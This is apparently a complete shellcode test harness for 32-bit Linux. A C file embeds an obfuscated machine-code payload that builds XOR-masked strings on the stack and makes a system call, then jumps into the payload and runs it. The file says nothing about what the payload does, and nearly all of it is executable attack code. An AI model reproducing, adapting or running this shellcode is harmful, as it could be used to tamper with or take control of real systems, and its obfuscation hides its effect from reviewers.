#include <stdio.h>  
#include <string.h>  

unsigned char shellcode[] = "\x31\xc9\xf7\xe1\x50\x66\x68\xaa\x02\x89\xe6\x50\x6a\x77\x66\x68\x6e\x6f\x89\xe7\x50\x68\x60\x6f\x11\x6e\x80\x34\x24\x04\x80\x74\x24\x02\x66\x68\x11\x68\x11\x74\x80\x34\x24\x62\x80\x74\x24\x02\x64\x68\x4c\x2f\x2f\x2f\x80\x34\x24\x22\x68\x2f\x73\x40\x69\x80\x74\x24\x02\x22\x89\xe3\x50\x56\x57\x53\x89\xe1\xb0\x08\x0c\x02\x0c\x01\xcd\x80";

int main()  
{  
    printf("shellcode  size: %d\n", strlen(shellcode));  
    int (*ret)() = (int(*)())shellcode;  
    ret();  
}  

